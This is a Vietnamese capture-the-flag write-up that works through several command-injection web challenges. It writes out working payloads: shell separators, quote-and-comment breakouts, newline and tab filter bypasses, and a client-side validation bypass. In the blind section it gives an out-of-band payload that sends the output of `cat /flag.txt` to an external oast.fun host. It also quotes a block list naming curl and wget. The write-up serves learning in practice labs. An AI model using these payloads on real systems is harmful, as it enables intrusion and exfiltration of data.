# NSLookup (Level 1):

![image](https://hackmd.io/_uploads/BJA94_-C1l.png)
- Có thể thấy trong phần code của web, input người dùng không được xử lú và dùng trực tiếp với lệnh `nslookup`
- Dùng `; ls -a`
![image](https://hackmd.io/_uploads/By7LSuWR1g.png)
- `; cd .. ; ls -a`
![image](https://hackmd.io/_uploads/SJZsBd-AJl.png)
- `; cd .. ; cat flag.txt`
![image](https://hackmd.io/_uploads/B1XzIObR1g.png)


# NSLookup (Level 2):

![image](https://hackmd.io/_uploads/BkThId-C1e.png)
- Code tương tự với bài trên, nhưng phần input người dùng nhập vào được đưa vào dấu `''` 
- Ta có thể bypass nó bằng việc dùng dấu `'` ở đầu và kết thúc bằng `#`: `' #`
- Thử `' ; ls -a #`
![image](https://hackmd.io/_uploads/SyEPPOZAJl.png)
- Tương tự với cách tìm bên trên: `' ; cd .. ; cat flag.txt #`
![image](https://hackmd.io/_uploads/H1ljw_bCkx.png)


# NSLookup (Level 3):
- Từ đầu bài, ta được biết `'cat', 'head', 'tail', 'less', 'strings', 'nl', "ls", "*", "curl", "wget"` đều đã bị chặn và không tồn tại trên hệ thống
- Thử với `; whoami` thì nhận được thông báo: **Please enter a valid domain.**
- view-source thì có phần JavaScript kiểm tra chuỗi nhập vào
![image](https://hackmd.io/_uploads/HkZk5d-Rye.png)
- Vì JavaScript này hoạt động ở phía Client, nên ta có thể sử dụng Burp Suite để gửi dữ liệu tùy ý đến server, bỏ qua sự kiểm tra của JavaScript
- Gửi đi 1 request đúng với `google.com`
![image](https://hackmd.io/_uploads/rJhFhdWRke.png)
- Ta thấy nó được sử dụng `nslookup 'google.com'`
- Payload: `google.com' ; find /flag?????.txt #`
![image](https://hackmd.io/_uploads/SJbPyt-Rye.png)
- Dùng `grep` để thay thế `cat`: `'; grep '' /flag1Poan.txt #`
![image](https://hackmd.io/_uploads/BJzjeY-R1g.png)


# ping-pong
- Là 1 trang web có 1 trường nhập để ping
![image](https://hackmd.io/_uploads/SJ3dMK-Akg.png)
- Thử qua với `;`, `&`, `|` thì đều bị chặn, kể cả dấu cách ` ` cũng bị chặn. Thử dùng `%0a` để xuống dòng và `%09` để dùng TAB thay vì dấu cách
- `1.1.1.1%0als%09-a`
![image](https://hackmd.io/_uploads/Skaqrtb0yx.png)
- `1.1.1.1%0acat%09/flag.txt`
![image](https://hackmd.io/_uploads/SyEgIYZCyx.png)

# Blind Command Injection
- Từ đầu bài ta có thể biết là không thể nhìn thấy kết quả và ta sẽ phải sử `OOB` và gợi ý dùng với method `OPTIONS`
![image](https://hackmd.io/_uploads/HyczwVGRke.png)
- Từ đầu bài ta cũng biết sẽ sử dụng `/?cmd=...`
- Trước tiên thử gửi request ping đến 1 server: `OPTIONS /?cmd=ping+nntcryeccdyaydrczncjueom77dmwlf62.oast.fun`
![image](https://hackmd.io/_uploads/B1lj_VMR1x.png)
- Kiểm tra bên server thì không nhận được request nào đến, và xem trong response thì có thể thấy ngoài `GET`, `OPTIONS` thì còn được allow cả `HEAD`
- `HEAD /?cmd=ping+nntcryeccdyaydrczncjueom77dmwlf62.oast.fun`
![image](https://hackmd.io/_uploads/SkpUt4fRJe.png)
- Kiểm tra log trên server thì thấy server mục tiêu đã gửi request đến
- `HEAD /?cmd=nslookup+$(ls).nntcryeccdyaydrczncjueom77dmwlf62.oast.fun`
![image](https://hackmd.io/_uploads/BypunNfCyl.png)
- Có thể thấy đã có file `run.py` được ghi vào, vậy là mình có thể dùng lệnh để `cat /flag.txt`
- `HEAD /?cmd=nslookup+$(cat+/flag.txt).nntcryeccdyaydrczncjueom77dmwlf62.oast.fun`
![image](https://hackmd.io/_uploads/HJzgTNGAkx.png)
- Lấy được flag

# Time
![image](https://hackmd.io/_uploads/ry-TR4GRJx.png)
![image](https://hackmd.io/_uploads/Hk-0REf01x.png)
- Trong source code được cung cấp, có thể thấy đoạn URL được chàn trực tiếp vào câu lệnh shell mà không được escape
- Khai thác cmdi ở đây, thử với `format=%H:%M:%S';+ls+-a'`
![image](https://hackmd.io/_uploads/HJWXgBfRJg.png)
- Nó hiện ra `views` thay vì giờ như ban đầu. Mặt khác ta lại có folder `views` trong source được cung cấp, vậy phần nào ta đã khẳng định được là cmdi thành công, thử với `cat /flag.txt` tiếp
- `format=%H:%M:%S';+cat+/flag.txt'`
![image](https://hackmd.io/_uploads/HyuubHM0kg.png)

# Command Limit Length
- `id`
- Có thể dùng `find` để thay thế `ls` hoặc bypass nó bảng `\` -> `l\s`
- [Chưa solve]
